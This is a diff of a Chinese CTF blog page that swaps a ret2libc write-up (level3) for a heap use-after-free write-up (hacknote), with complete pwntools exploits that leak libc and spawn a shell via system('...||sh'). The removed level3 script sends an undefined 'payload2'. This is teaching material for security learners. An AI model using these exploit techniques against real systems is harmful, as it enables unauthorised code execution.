@@ -6,27 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>攻防世界新手区get_shell、level3 | HandsomeJack</title>
+  <title>攻防世界进阶区hacknote | HandsomeJack</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="[攻防世界]新手区get_shell和level3get_shell先说这个神奇的get_shell题，我实在想不明白为什么这道题可以值7分，我还以为是新手区的压轴题，万万没想到，它真就如题所说的那样，“运行就能拿到shell呢，真的”IDA：">
+  <meta name="description" content="[攻防世界]进阶区hacknote又一道堆利用的题，虽然是堆利用的题，不过这题比较好利用漏洞，我感觉这题不好写的地方就在于如何利用system拿到shell，这道题没法直接用system(&#x2F;bin&#x2F;sh)，需要用到linux执行的技巧。这道题给了libc，所以一会就不用自己泄露libc地址了，可以直接用。32位、能覆写、有栈保护、有nx，没随机地址。可以覆写，但是由于不能修改堆内容，只有创建堆的时">
 <meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="攻防世界新手区get_shell、level3">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;07&#x2F;level3&#x2F;index.html">
+<meta property="og:title" content="攻防世界进阶区hacknote">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;10&#x2F;17&#x2F;hacknote&#x2F;index.html">
 <meta property="og:site_name" content="HandsomeJack">
-<meta property="og:description" content="[攻防世界]新手区get_shell和level3get_shell先说这个神奇的get_shell题，我实在想不明白为什么这道题可以值7分，我还以为是新手区的压轴题，万万没想到，它真就如题所说的那样，“运行就能拿到shell呢，真的”IDA：">
+<meta property="og:description" content="[攻防世界]进阶区hacknote又一道堆利用的题，虽然是堆利用的题，不过这题比较好利用漏洞，我感觉这题不好写的地方就在于如何利用system拿到shell，这道题没法直接用system(&#x2F;bin&#x2F;sh)，需要用到linux执行的技巧。这道题给了libc，所以一会就不用自己泄露libc地址了，可以直接用。32位、能覆写、有栈保护、有nx，没随机地址。可以覆写，但是由于不能修改堆内容，只有创建堆的时">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;07&#x2F;level3&#x2F;a.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;07&#x2F;level3&#x2F;b.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;07&#x2F;level3&#x2F;c.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;07&#x2F;level3&#x2F;d.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;07&#x2F;level3&#x2F;f.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;07&#x2F;level3&#x2F;g.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;07&#x2F;level3&#x2F;h.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;07&#x2F;level3&#x2F;i.png">
-<meta property="og:updated_time" content="2020-02-07T04:25:30.639Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;10&#x2F;17&#x2F;hacknote&#x2F;a.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;10&#x2F;17&#x2F;hacknote&#x2F;b.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;10&#x2F;17&#x2F;hacknote&#x2F;c.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;10&#x2F;17&#x2F;hacknote&#x2F;d.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;10&#x2F;17&#x2F;hacknote&#x2F;d1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;10&#x2F;17&#x2F;hacknote&#x2F;d2.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;10&#x2F;17&#x2F;hacknote&#x2F;e.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;10&#x2F;17&#x2F;hacknote&#x2F;f.png">
+<meta property="og:updated_time" content="2020-10-17T08:24:45.532Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;07&#x2F;level3&#x2F;a.png">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;10&#x2F;17&#x2F;hacknote&#x2F;a.png">
   
     <link rel="alternative" href="/atom.xml" title="HandsomeJack" type="application/atom+xml">
   
@@ -191,57 +191,40 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-level3" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-hacknote" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      攻防世界新手区get_shell、level3
+      攻防世界进阶区hacknote
     </h1>
   
 
         
-        <a href="/2020/02/07/level3/" class="archive-article-date">
-  	<time datetime="2020-02-07T04:22:19.598Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-07</time>
+        <a href="/2020/10/17/hacknote/" class="archive-article-date">
+  	<time datetime="2020-10-17T03:35:17.363Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-17</time>
 </a>
         
       </header>
-<div align="center" class="post-count">字数：765字 | 预计阅读时长：3分钟</div>
+<div align="center" class="post-count">字数：1.1k字 | 预计阅读时长：4分钟</div>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="攻防世界-新手区get-shell和level3"><a href="#攻防世界-新手区get-shell和level3" class="headerlink" title="[攻防世界]新手区get_shell和level3"></a>[攻防世界]新手区get_shell和level3</h1><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h2><p>先说这个神奇的get_shell题，我实在想不明白为什么这道题可以值7分，我还以为是新手区的压轴题，万万没想到，它真就如题所说的那样，“运行就能拿到shell呢，真的”<br>IDA：<br><img src="a.png" alt="真没啥可说的，运行即可"></p>
+        <h1 id="攻防世界-进阶区hacknote"><a href="#攻防世界-进阶区hacknote" class="headerlink" title="[攻防世界]进阶区hacknote"></a>[攻防世界]进阶区hacknote</h1><p>又一道堆利用的题，虽然是堆利用的题，不过这题比较好利用漏洞，我感觉这题不好写的地方就在于如何利用system拿到shell，这道题没法直接用system(/bin/sh)，需要用到linux执行的技巧。<br>这道题给了libc，所以一会就不用自己泄露libc地址了，可以直接用。<br><img src="a.png" alt="checksec先"><br>32位、能覆写、有栈保护、有nx，没随机地址。可以覆写，但是由于不能修改堆内容，只有创建堆的时候才可以写入，所以可以在创建时让指针指向任一函数的got表地址，但是没法修改其内容，只好另寻他路。<br>运行一下，发现是个菜单题，可以执行添加、删除、输出操作。</p>
 <a id="more"></a>
-<p>这个真的是运行就能拿到flag。。没任何坑</p>
-<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>这个题，拿到文件以后还给了个libc，估计是要自己计算system地址。<br>先查看文件信息及保护措施<br><img src="b.png" alt=""><br>32为IDA打开<br><img src="c.png" alt=""><br>既没有system，也没有/bin/sh或cat flag，但是有read和write，所以可以利用write泄露libc中system地址，并找到’/bin/sh’让system调用<br><img src="d.png" alt=""><br>接下来计算溢出需要的偏移，用gdb的pattern脚本生成200个字符，运行level3程序，直接输入200个字符<br><img src="f.png" alt=""><br>查看溢出点<br><img src="g.png" alt=""><br>利用pattern offset计算需要填充的字符数<br><img src="h.png" alt=""><br>即’a’*140</p>
-<h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><ol>
-<li>因为libc开着地址随机化，所以偏移会变化，必须在同一次运行内进行两次攻击，确保offset不变</li>
-<li>第一次攻击，利用write函数，泄露其真实地址，通过计算得到libc加载的基地址</li>
-<li>已知libc的基地址，计算system的真实地址和字符串’/bin/sh’的真实地址</li>
-<li>第二次攻击，构造system(“/bin/sh”)，拿到shell</li>
-<li>拿到flag<h3 id="计算公式："><a href="#计算公式：" class="headerlink" title="计算公式："></a>计算公式：</h3></li>
+<p><img src="b.png" alt="运行图"><br>32位IDA打开看看,main主要就是菜单选择<br><img src="c.png" alt=""></p>
+<p>Add函数：<br><img src="d.png" alt="add"><br>可以看到最多创建5个堆块，且每次add一个新笔记时，会malloc两次，第一次malloc 0x8的块，姑且叫它note，ptr[i]和p0[0]均指向该块；第二次会malloc size的块，这个块存储输入的数据，就叫它contant，ptr[i]+1和p0[1]指向该块。<br>contant的内容是由我们输入的，note的内容是程序设定的，第22行的操作就是把函数sub_804862B地址放到ptr[i]指向的位置，由于是32位程序，所以会占用0x4的空间，点进去看看sub_804862B是个干什么的函数：<br><img src="d1.png" alt=""><br>是要传入一个参数a1，然后puts输出*(a1+4)处的数据，结合该程序输出函数sub_80488A5中的(*(void (__cdecl **)(void *))ptr[v1])(ptr[v1])  ，可以看出，当ptr[v1]指向note时，可以翻译成 puts*(note+4)，由此可推断note堆中后0x4位应该是contant的地址，否则就没法输出contant内容了。<br>画出堆结构：<br><img src="d2.png" alt="堆结构"></p>
+<p>Del函数：<br><img src="e.png" alt=""><br>两次free，先free掉contant，然后才是note结构体，且都没有置NULL，会留下两个野指针仍指着原先的位置，所以存在着uaf漏洞。</p>
+<h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><ol>
+<li>Add两个新笔记，分别为0号和1号，大小均为0x20 (只要不是0x8就行，0x8的话，free以后会使note和contant进入同一个fastbins，不方便利用)。<br><img src="f.png" alt="第一步"></li>
+<li>先Del掉0号笔记，然后Del 1号笔记，让note块进入fastbins，此时0x8的fastbins如下。</li>
 </ol>
-<p><strong>libc加载的基地址 = write真实地址 - write在libc中的偏移量<br>system真实地址  = libc加载的基地址 + system在libc中的偏移量<br>/bin/sh真实地址 = libc加载的基地址 + /bin/sh在libc中的偏移量</strong></p>
-<p>其中 “/bin/sh在libc中的偏移量” 不知道为啥我用search查不到，所以我用winhex打开了libc，搜索字符串，得到0x159020+0xb，即0x15902b<br><img src="i.png" alt=""></p>
-<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./level3'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"> </span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'111.198.29.45'</span>,<span class="number">30808</span>)</span><br><span class="line"></span><br><span class="line">payload0 = <span class="string">'a'</span>*<span class="number">140</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"Input:\n"</span>,payload0)  <span class="comment">#第一次攻击</span></span><br><span class="line"></span><br><span class="line">write_got_addr = u32(sh.recv()[:<span class="number">4</span>])<span class="comment">#得到write函数的真实地址，32位收到的包长4位，所以用[:4]</span></span><br><span class="line"></span><br><span class="line">libc_addr = write_got_addr - libc.symbols[<span class="string">'write'</span>]  <span class="comment">#计算libc加载的基地址</span></span><br><span class="line">sys_addr = libc_addr + libc.symbols[<span class="string">'system'</span>]  <span class="comment">#计算system函数真实地址</span></span><br><span class="line">bin_sh_addr = libc_addr + <span class="number">0x15902b</span>  <span class="comment">#计算'/bin/sh'真实地址，这个0x15902b就是/bin/sh在libc中的偏移量</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">140</span> + p32(sys_addr) + p32(<span class="number">0x1234</span>) + p32(bin_sh_addr)</span><br><span class="line">sh.sendline(payload2)  <span class="comment">#第二次攻击</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<p>payload0解释：</p>
-<ol>
-<li>‘a’*140：用于填充，使栈溢出，上文用pattern offset计算出140</li>
-<li>p32(write_plt)：write在plt表中的地址，让read完后进入write</li>
-<li>p32(main_addr)：main函数地址，是write函数的返回地址，让write执行完后，返回main函数，这样就能进行第二次攻击</li>
-<li>p32(1)：write函数的第一个参数</li>
-<li>p32(write_got)：write函数的第二个参数，此为write要泄露的自身真实地址</li>
-<li>p32(4)：write函数的第三个参数</li>
-</ol>
-<p>payload1解释：</p>
-<ol>
-<li>‘a’*140：用于填充，使栈溢出，上文用pattern offset计算出140</li>
-<li>p32(sys_addr)：system的真实地址，让read完后进入system</li>
-<li>p32(0x1234)：随便填充一个system的返回地址</li>
-<li>p32(bin_sh_addr)：bin/sh的地址，当system参数</li>
-</ol>
+<p><strong>0x8 fastbins：→note1→note0</strong><br>由于fastbins是单链表维护的，所以<strong>先进后出</strong>，所以下次Add的块符合条件时，会先取用note1，然后才是note0。<br>3. Add 一个大小0x8的2号笔记，2号笔记的note2就是曾经note1的块，而contant2就是曾经note0的块。<br>4. 在contant2中写入puts(puts_got)，并用指针调用来泄露puts的got地址，并计算libc加载基址。<br>5. Del 2号笔记，Add 大小0x8的3号笔记，此时note3是曾经的note1，contant3是曾经的note0。<br>6. 由于Print函数是用指针执行note中的函数，所以在contant3中的写入system地址，用Print 0时，就会利用没有被NULL的ptr[0]指针调用指向的system函数，但程序中note结构中的输出函数实际上输出的是 *(其本身位置+4) 处的内容，但当我们把这个输出函数替换成system时，构成的实际上是system(system地址和后续内容)，就会形成乱码，所以需要用到一个linux的使用技巧，就是shell的条件判断 || ，写入p32(system_addr)+’||sh’，此时用Print 0调用时，就会形成system(system_addr||sh)，由于system(system_addr)不可执行，所以就会执行system(sh)，前0x4已经写入了system的地址，所以还有0x4的空间刚好写入’||sh’。</p>
+<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'220.249.52.133'</span>,<span class="number">31042</span>)</span><br><span class="line">elf=ELF(<span class="string">'./hacknote'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Note size :'</span>,str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'Content :'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Print</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice :'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index :'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Del</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice :'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index :'</span>,str(index))</span><br><span class="line"></span><br><span class="line">Add(<span class="number">0x20</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">Add(<span class="number">0x20</span>,<span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line">Del(<span class="number">0</span>)</span><br><span class="line">Del(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">sub_804862B=<span class="number">0x0804862B</span></span><br><span class="line">Add(<span class="number">0x8</span>,p32(sub_804862B)+p32(puts_got)) <span class="comment">#泄露puts的got地址</span></span><br><span class="line">Print(<span class="number">0</span>)</span><br><span class="line">puts_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">'puts'</span>] <span class="comment">#计算加载基址</span></span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">'system'</span>] <span class="comment">#计算system地址</span></span><br><span class="line"></span><br><span class="line">Del(<span class="number">2</span>)</span><br><span class="line">payload=p32(system_addr)+<span class="string">'||sh'</span></span><br><span class="line">Add(<span class="number">0x8</span>,payload)</span><br><span class="line">Print(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>关于linux的shell命令条件判断：<a href="https://blog.csdn.net/shang_feng_wei/article/details/90378017" target="_blank" rel="noopener">可以看篇文章</a></p>
 
       
 
@@ -337,7 +320,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/02/07/level3/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/10/17/hacknote/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -351,18 +334,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/02/08/CGfsb/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          攻防世界新手区CGfsb
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/02/02/guess_num/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">攻防世界新手区guess_num</div>
+    <a href="/2020/10/04/babyfengshui/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">攻防世界进阶区babyfengshui</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -389,7 +363,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#攻防世界-新手区get-shell和level3"><span class="toc-number">1.</span> <span class="toc-text">[攻防世界]新手区get_shell和level3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">1.1.</span> <span class="toc-text">get_shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3"><span class="toc-number">1.2.</span> <span class="toc-text">level3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#思路："><span class="toc-number">1.2.1.</span> <span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#计算公式："><span class="toc-number">1.2.2.</span> <span class="toc-text">计算公式：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP："><span class="toc-number">1.2.3.</span> <span class="toc-text">EXP：</span></a></li></ol></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#攻防世界-进阶区hacknote"><span class="toc-number">1.</span> <span class="toc-text">[攻防世界]进阶区hacknote</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#思路："><span class="toc-number">1.1.</span> <span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP："><span class="toc-number">1.2.</span> <span class="toc-text">EXP：</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -414,7 +388,7 @@
 <script src="https://billts.site/js/gitment.js"></script>
 <script>
 var gitment = new Gitment({
-  id: "http://yoursite.com/2020/02/07/level3/",
+  id: "http://yoursite.com/2020/10/17/hacknote/",
   owner: 'SpHandsomeJack',
   repo: 'gitment-comment',
   oauth: {
